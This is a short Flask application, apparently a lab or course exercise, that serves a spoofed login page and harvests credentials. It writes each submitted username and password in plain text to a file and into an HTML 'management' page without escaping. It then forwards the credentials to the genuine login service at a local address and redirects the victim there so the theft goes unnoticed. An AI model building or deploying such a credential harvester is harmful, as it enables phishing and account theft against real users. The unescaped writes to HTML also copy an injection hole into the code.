from flask import Flask, request, redirect, render_template
import requests


app = Flask(__name__)


''' This produces the home page '''
@app.route('/')
def home():
    return render_template('A5.html')


''' Takes care of the POST request after submitting the form '''
@app.route('/submit', methods=['POST'])
def submit():
   
    ''' Obtain the username and passwords from the HTML form after submission '''
    username = request.form.get("username")
    password = request.form.get("password")




    ''' Saves the username and password in obtained5.txt '''
    with open('obtained5.txt', "a", encoding="utf8") as obtained_info:
        obtained_info.write("Username: " + username + "\n")
        obtained_info.write("Password: " + password + "\n")




    ''' Creates the management page '''
    with open('./templates/management.html', "a", encoding="utf8") as management_page:
        management_page.write("<p>Username: " + username + ", Password: " + password + "</p>")
   


    ''' Redirects the user to the actual login page if they hit login '''
    ''' Sends the user to the spoofed custom login page if they hit custom page '''
    if 'submit' in request.form:
        requests.post("http://127.0.0.1:2222/", data={'username': username, 'password': password, "submit": "submit"})
        return redirect('http://127.0.0.1:2222/', code=307)
   
    elif 'customPage' in request.form:
        return render_template('A5.html', username=username)


if __name__ == "__main__":
    app.run()